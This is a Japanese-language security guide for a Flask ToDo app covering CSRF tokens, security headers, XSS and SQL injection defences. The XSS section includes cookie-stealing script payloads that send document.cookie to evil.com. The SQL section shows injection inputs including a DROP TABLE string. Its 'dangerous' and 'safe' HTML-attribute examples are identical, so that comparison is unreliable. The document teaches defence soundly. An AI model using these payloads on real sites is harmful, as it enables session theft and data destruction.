### セキュリティガイド

#### CSRF（Cross-Site Request Forgery）対策

##### CSRFとは

CSRF（クロスサイトリクエストフォージェリ）は、ユーザーが意図しないリクエストを
攻撃者が強制的に実行させる攻撃です。

##### 攻撃シナリオ

1. ユーザーが銀行サイトにログイン（セッション確立）
2. ユーザーが攻撃者のサイトにアクセス
3. 攻撃者のサイトが隠しフォームで銀行サイトに送金リクエスト
4. ブラウザがCookieを自動送信 → 銀行サイトは正規リクエストと判断
5. ユーザーの意図しない送金が実行される


##### Flask-WTFによるCSRF対策

Flask-WTFは自動的にCSRF対策を提供します。

###### 仕組み

1. サーバーがランダムなトークンを生成しセッションに保存
2. フォームの隠しフィールドにトークンを埋め込む
3. フォーム送信時、トークンも一緒に送信される
4. サーバーがセッションのトークンと送信されたトークンを照合
5. 一致すれば正規リクエスト、不一致なら拒否（403エラー）


###### 実装確認

**設定（app/config.py）:**

    class Config:
        WTF_CSRF_ENABLED = True  # CSRF保護有効
        WTF_CSRF_TIME_LIMIT = None  # トークン有効期限（セッション期限）

**Application Factory（app/__init__.py）:**

    from flask_wtf.csrf import CSRFProtect

    csrf = CSRFProtect()

    def create_app(config_name='default'):
        app = Flask(__name__)
        # ...
        csrf.init_app(app)
        # ...

**フォーム（app/forms/auth_forms.py）:**

    from flask_wtf import FlaskForm

    class SignupForm(FlaskForm):
        # FlaskFormを継承すると自動的にCSRF保護が有効
        pass

**テンプレート（app/templates/auth/signup.html）:**

    <form method='POST'>
        {{ form.hidden_tag() }}  <!-- CSRFトークンを含む隠しフィールド -->
        <!-- ... -->
    </form>

##### CSRF対策のテスト

正しく保護されているか確認します。

###### テストケース


1.**正常系：CSRFトークンありでフォーム送信**
   → 成功するはず

2.**異常系：CSRFトークンなしでフォーム送信**
   → 400 Bad Requestになるはず

3.**異常系：無効なCSRFトークンでフォーム送信**
   → 400 Bad Requestになるはず

##### AJAXリクエストのCSRF対策

AJAXでPOST/PUT/DELETEする場合もCSRFトークンが必要です。

###### 方法1: メタタグから取得

**テンプレート:**

    <meta name='csrf-token' content='{{ csrf_token() }}'>

**JavaScript:**

    const token = document.querySelector("meta[name='csrf-token']").content;

    fetch('/api/todos', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRFToken': token
        },
        body: JSON.stringify(data)
    });

###### 方法2: Flask-WTF設定

    # app/config.py
    class Config:
        WTF_CSRF_HEADERS = ['X-CSRFToken', 'X-CSRF-Token']

##### ベストプラクティス

1.**常にCSRF保護を有効化**
   -全てのPOST/PUT/DELETEリクエストで保護

2.**例外は慎重に**
   -APIエンドポイント等で無効化する場合は、他の認証方法を使用

       @csrf.exempt
       @api_bp.route('/endpoint', methods=['POST'])
       def api_endpoint():
           # JWT等の他の認証を使用
           pass

3.**SameSite Cookie属性**

       # app/config.py
       SESSION_COOKIE_SAMESITE = 'Lax'  # または 'Strict'

4.**HTTPSの使用**
   -本番環境では必ずHTTPSを使用

       # app/config.py
       class ProductionConfig(Config):
           SESSION_COOKIE_SECURE = True  # HTTPS必須


#### セキュリティヘッダー

##### 主要なセキュリティヘッダー

###### 1. X-Content-Type-Options: nosniff

**目的:** MIMEタイプスニッフィング攻撃を防ぐ

**説明:**
ブラウザがContent-Typeを無視してファイルの内容から自動判定するのを防ぎます。

**攻撃例:**

```text
1. 攻撃者が malicious.jpg という名前の JavaScript ファイルをアップロード
2. サーバーは Content-Type: image/jpeg で配信
3. ブラウザが中身を解析し「これは JavaScript だ」と判断して実行
4. → nosniff を設定すると、ブラウザは Content-Type を信頼し、自動判定しない
```

**設定:**

    response.headers['X-Content-Type-Options'] = 'nosniff'

###### 2. X-Frame-Options: SAMEORIGIN

**目的:** クリックジャッキング攻撃を防ぐ

**説明:**
他のサイトがiframeでこのサイトを埋め込むのを防ぎます。

**攻撃例:**

```text
1. 攻撃者が自分のサイトに透明な iframe で ToDo App を埋め込む
   <iframe src="https://todo-app.com/todos/1/delete" style="opacity:0">
2. iframe の上に「プレゼントを受け取る」ボタンを重ねて配置
3. ユーザーがボタンをクリック → 実際には iframe 内の「削除」ボタンをクリック
4. → X-Frame-Options: SAMEORIGIN で iframe 埋め込みを同一オリジンのみに制限
```

**設定:**

    response.headers['X-Frame-Options'] = 'SAMEORIGIN'

**値:**
- `DENY`: 全ての iframe で表示禁止
- `SAMEORIGIN`: 同一オリジンの iframe のみ許可

###### 3. X-XSS-Protection: 1; mode=block

**目的:** ブラウザのXSSフィルターを有効化

**説明:**
古いブラウザ向けのXSS保護機能。
最近のブラウザではContent-Security-Policyが推奨。

**設定:**

    response.headers['X-XSS-Protection'] = '1; mode=block'

**値:**
- `0`: 無効
- `1`: 有効（サニタイズして表示）
- `1; mode=block`: 有効（ページ表示をブロック）

###### 4. Strict-Transport-Security (HSTS)

**目的:** HTTPS接続を強制

**説明:**
一度HTTPSでアクセスしたら、以降は常にHTTPSでアクセスするようブラウザに指示。

**フロー:**

```text
初回アクセス:
  ブラウザ → http://todo-app.com → サーバーが https:// にリダイレクト
  サーバー → レスポンスヘッダーに Strict-Transport-Security を付与

2回目以降:
  ブラウザ → http://todo-app.com と入力しても、
  ブラウザが自動的に https://todo-app.com に変換してからリクエスト
  （サーバーへの HTTP リクエストが発生しない = 中間者攻撃を防止）
```

**設定:**

    # 本番環境のみ
    response.headers['Strict-Transport-Security'] = 'max-age=31536000; includeSubDomains'

**パラメータ:**
- `max-age`: HTTPS強制期間（秒）
- `includeSubDomains`: サブドメインも対象
- `preload`: ブラウザのHSTSプリロードリストに登録

**注意:**
- HTTPSが利用できる環境でのみ設定
- 開発環境では設定しない

###### 5. Content-Security-Policy (CSP)

**目的:** XSS攻撃を防ぐ（最も強力）

**説明:**
どのリソース（JavaScript、CSS、画像等）をどこから読み込むか制限。

**基本的な設定:**

    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self' https://cdn.jsdelivr.net; "
        "style-src 'self' https://cdn.jsdelivr.net; "
        "img-src 'self' data:;"
    )

**ディレクティブ:**
- `default-src`: デフォルトのポリシー
- `script-src`: JavaScriptの読み込み元
- `style-src`: CSSの読み込み元
- `img-src`: 画像の読み込み元
- `connect-src`: XHR、WebSocket等の接続先

**値:**
- `'self'`: 同一オリジンのみ
- `'unsafe-inline'`: インラインスクリプト許可（非推奨）
- `'unsafe-eval'`: eval()許可（非推奨）
- `https://example.com`: 特定のドメイン

##### 実装

**app/__init__.py:**

    @app.after_request
    def set_security_headers(response):
        '''セキュリティヘッダー設定'''
        # MIMEスニッフィング防止
        response.headers['X-Content-Type-Options'] = 'nosniff'

        # クリックジャッキング防止
        response.headers['X-Frame-Options'] = 'SAMEORIGIN'

        # XSSフィルター有効化（古いブラウザ向け）
        response.headers['X-XSS-Protection'] = '1; mode=block'

        # HTTPS強制（本番環境のみ）
        if app.config.get('ENV') == 'production':
            response.headers['Strict-Transport-Security'] = \
                'max-age=31536000; includeSubDomains'

        # Content Security Policy（将来実装）
        # response.headers['Content-Security-Policy'] = \
        #     "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net"

        return response

#### XSS（Cross-Site Scripting）対策

##### XSSとは

攻撃者が悪意のあるスクリプトを注入し、他のユーザーのブラウザで実行させる攻撃。

##### 攻撃例

**反射型XSS:**

```text
1. 攻撃者が以下のURLをユーザーに送る:
   https://todo-app.com/search?q=<script>document.location='https://evil.com/?cookie='+document.cookie</script>
2. サーバーが検索クエリをそのままHTMLに埋め込んで返す
3. ユーザーのブラウザでスクリプトが実行される
4. Cookie（セッションID）が攻撃者のサーバーに送信される
```

**格納型XSS:**

```text
1. 攻撃者が ToDo のタイトルに悪意あるスクリプトを保存:
   タイトル: <script>fetch('https://evil.com/?cookie='+document.cookie)</script>
2. このスクリプトがDBに保存される
3. 他のユーザー（例: 管理者）がこの ToDo を表示する
4. ブラウザでスクリプトが実行され、管理者の Cookie が盗まれる
※ 格納型は反射型より危険（URLをクリックさせる必要がない）
```

##### Flask/Jinja2によるXSS対策

###### 自動エスケープ

Jinja2は自動的にHTMLエスケープします。

**安全：**

    <p>{{ user_input }}</p>

    <!-- user_input = '<script>alert("XSS")</script>' の場合 -->
    <!-- 出力: <p>&lt;script&gt;alert("XSS")&lt;/script&gt;</p> -->
    <!-- スクリプトは実行されない -->

**危険（絶対に使わない）：**

    <p>{{ user_input|safe }}</p>

    <!-- エスケープが無効化される -->
    <!-- スクリプトが実行される -->

###### ベストプラクティス

1. **`|safe`フィルターは使わない**
   - どうしても必要な場合は、入力を厳密にサニタイズ

2. **HTML属性でも注意**

       <!-- 危険 -->
       <div data-value='{{ user_input }}'></div>

       <!-- 安全（Jinja2が自動エスケープ） -->
       <div data-value='{{ user_input }}'></div>

3. **JavaScriptコンテキスト**

       <!-- 危険 -->
       <script>
           var data = '{{ user_input }}';
       </script>

       <!-- 安全 -->
       <script>
           var data = {{ user_input|tojson }};
       </script>

4. **URLコンテキスト**

       <!-- 危険 -->
       <a href='{{ user_input }}'>リンク</a>

       <!-- 安全 -->
       <a href='{{ url_for('page', param=user_input) }}'>リンク</a>

#### SQLインジェクション対策

##### SQLインジェクションとは

攻撃者がSQL文を注入し、データベースを不正操作する攻撃。

##### 攻撃例

**脆弱なコード（使用禁止）:**

```python
# ❌ 危険！ ユーザー入力を直接SQL文に埋め込んでいる
query = f"SELECT * FROM users WHERE username = '{username}'"
result = db.session.execute(query)

# username = "admin' OR '1'='1" を入力した場合:
# SQL: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
# → WHERE 条件が常に True になり、全ユーザーが取得される

# username = "admin'; DROP TABLE users; --" を入力した場合:
# SQL: SELECT * FROM users WHERE username = 'admin'; DROP TABLE users; --'
# → users テーブルが削除される
```

##### SQLAlchemy（ORM）による対策

ORMを使用すると自動的にエスケープされます。

**安全：**

```python
# ✅ SQLAlchemy ORM（パラメータが自動的にエスケープされる）
user = User.query.filter_by(username=username).first()

# または
user = User.query.filter(User.username == username).first()

# username = "admin' OR '1'='1" を入力しても:
# SQLAlchemy が 'admin'' OR ''1''=''1' とエスケープするため、
# 単純な文字列検索として処理される → 攻撃失敗
```

**生SQLを使う場合（非推奨）:**

    # パラメータバインディングを使用
    from sqlalchemy import text

    query = text('SELECT * FROM users WHERE username = :username')
    result = db.session.execute(query, {'username': username})

##### ベストプラクティス

1. **常にORMを使用**
   - 生SQLは避ける

2. **動的クエリは慎重に**

       # 危険
       query = f'SELECT * FROM {table_name}'

       # 安全（ホワイトリスト）
       allowed_tables = ['users', 'todos']
       if table_name in allowed_tables:
           query = text(f'SELECT * FROM {table_name}')

3. **ユーザー入力は常に検証**
   - バリデーション（WTForms）
   - サニタイゼーション